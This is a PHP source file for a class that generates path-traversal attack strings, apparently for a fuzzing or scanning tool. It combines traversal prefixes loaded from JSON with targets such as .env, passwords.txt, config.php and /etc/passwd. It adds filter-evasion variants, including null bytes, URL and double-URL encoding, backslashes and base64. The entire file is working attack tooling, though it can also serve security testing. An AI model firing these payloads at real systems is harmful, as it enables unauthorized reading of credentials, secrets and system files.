<?php

namespace App\Engine;

class PayloadGenerator {
    private const FILE_SAMPLE = [
        'config.php',
        'index.php',
        '.env',
        'secret.txt',
        'passwords.txt',
        'admin/config.php',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
    ];
    
    private $patterns = [];

    public function __construct(string $dir) {
        $this->patterns = json_decode(file_get_contents($dir), true);
    }
    
    public function generatePatterns(): array {
        $raw = $this->getOriginalPatterns();

        $traversals = [];

        foreach ($raw as $entry) {
            $patterns = $entry['patterns'];
            foreach ($patterns as $pattern) {
                $traversals[] = $pattern;
            }
        }

        return $traversals;
    }

    public function generatePayloads(): array {
        $payloads = [];
        foreach ($this->getPatterns() as $prefix) {
            foreach (self::FILE_SAMPLE as $target) {
                for ($i=1; $i<=3; $i++) {
                    $step = str_repeat($prefix, $i);
                    $path = $step . $target;

                    $payloads[] = $path;
                    // Escaped
                    $payloads[] = addslashes($path);
                    // Windows-Style
                    $payloads[] = str_replace('/', '\\', $path);
                    // Null byte
                    $payloads[] = $path . '%00';
                    // Obfuscation dots
                    $payloads[] = $path . "...";
                    // URL encoding
                    $payloads[] = rawurlencode($path);
                    // Double URL encoding
                    $payloads[] = rawurlencode(rawurlencode($path));
                    // Base64 encoding
                    $payloads[] = base64_encode($path);
                }
            }
        }

        // Remove duplicates
        $payloads = array_values(array_unique($payloads));

        return $payloads;
    }

    public function getOriginalPatterns(): array {
        return $this->patterns;
    }

    public function getPatterns(): array {
        return $this->generatePatterns();
    }

    public function getPayloads(): array {
        return $this->generatePayloads();
    }
}